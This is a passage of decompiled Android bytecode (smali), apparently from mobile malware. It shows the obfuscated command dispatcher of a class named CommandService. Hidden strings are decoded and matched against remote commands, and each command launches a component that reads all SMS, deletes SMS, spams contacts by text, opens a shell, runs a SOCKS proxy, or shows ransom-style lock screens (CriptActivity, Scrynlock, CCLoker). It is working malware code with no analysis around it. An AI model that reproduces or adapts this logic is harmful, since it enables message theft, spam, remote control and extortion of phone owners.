    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "\u0014[\r"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_d
    aget-object v0, v4, v1

    const-string v5, "h9p\u0011J\"n:C%"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_e

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/GetAllSms;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "\u0014[\r"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_e
    aget-object v0, v4, v1

    const-string v5, "k3C:p%B%"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_f

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/DellSms;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_f
    aget-object v0, v4, v1

    const-string v5, "\u0012l/m\u001ez1h,"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_10

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "S8Z;M3]k"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "u5l9}|"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    aget-object v5, v4, v1

    const-string v6, "\"J.[k"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    sget-object v6, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    aget-object v8, v5, v11

    invoke-virtual {v7, v2, v8}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-class v6, Lcompse/refact/st/upsssss/SmsSpamContact;

    invoke-direct {v0, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v6, "2}3"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    aget-object v5, v5, v11

    invoke-virtual {v0, v6, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v5, "\u0003}\u001a"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_10
    aget-object v0, v4, v1

    const-string v5, "Z5h3}7l#V\"h-e|"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_11

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "S\u0005[7]\"Y3M3M%p5N:Ck"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "u2\u007f$k%z5~${6"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lcompse/refact/st/upsssss/StartWeb;

    invoke-direct {v5, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v6, "%[$"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v5, "\u0014[\r"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_11
    aget-object v0, v4, v1

    const-string v5, "\u0017_&p5N:Ck"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_12

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "u\u0000y1V\"h-e|"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "S7_&\\\""

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lcompse/refact/st/upsssss/StartApp;

    invoke-direct {v5, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v6, "2}3"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_12
    aget-object v0, v4, v1

    const-string v5, "\u0005G3C:\\k"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_13

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "u\u0012a$e-z|"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "S7_&\\\""

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lcompse/refact/st/upsssss/Shells;

    invoke-direct {v5, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v6, "2}3"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v5, "\u0003}\u001a"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_13
    aget-object v0, v4, v1

    const-string v5, "N.V\u0002{8y5"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_14

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/Crypt/CriptActivity$mainActivity;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "\u0003}\u001a"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_14
    aget-object v0, v4, v1

    const-string v5, "\u0006f\u001eZ\"{$l/"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_15

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "\u0003}\u001a"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_15
    aget-object v0, v4, v1

    const-string v5, "\u0002J\rf*l3"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_16

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/CCLoker$mainActivity;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "\u0003}\u001a"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_16
    aget-object v0, v4, v1

    const-string v5, "K$j*V\u0002{8y5"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_17

    new-instance v0, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "\u00000]7H%\u0001\"W\""

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v0, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    :cond_17
    aget-object v0, v4, v1

    const-string v5, "z5h3}\u0012f\"b2"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_18

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "%[7]\"|9L=\\k"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "u1f3}|"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v5, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v6, v4, v1

    const-string v7, "S&@$[k"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "=|2{|"

    invoke-static {v8}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v6, v7, v8}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v7, v4, v1

    const-string v8, "*Z%]k"

    invoke-static {v8}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v9, "u1h2z|"

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v7, v8, v9}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iget-object v7, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v8, v4, v1

    const-string v9, "S&N%\\k"

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v10, "=l/m\"d%"

    invoke-static {v10}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v7, v8, v9, v10}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "false"

    if-eq v0, v8, :cond_18

    new-instance v8, Landroid/content/Intent;

    const-class v9, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;

    invoke-direct {v8, p0, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v9, "_7\\%"

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v7

    const-string v8, "y.{5"

    invoke-static {v8}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v7, "#\\$"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v6, "z5h3}\u0012f\"b2"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_18
    aget-object v0, v4, v1

    const-string v5, "%J8K\u0005b\u0005\\&N;"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_19

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "u/|,k${|"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "S\"J.[k"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v5, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v6, v4, v1

    const-string v7, "u5l9}|"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "*J8K5B2"

    invoke-static {v8}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v6, v7, v8}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v6, Landroid/content/Intent;

    const-class v7, Lcompse/refact/st/upsssss/Spamsmsbase;

    invoke-direct {v6, p0, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v7, "/|,k${e"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v6, "\u0003}\u001a"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iget-object v7, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v6, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v6, "5l9}e"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_19
    aget-object v0, v4, v1

    const-string v5, "|\"N$[\tf8E3L\""

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

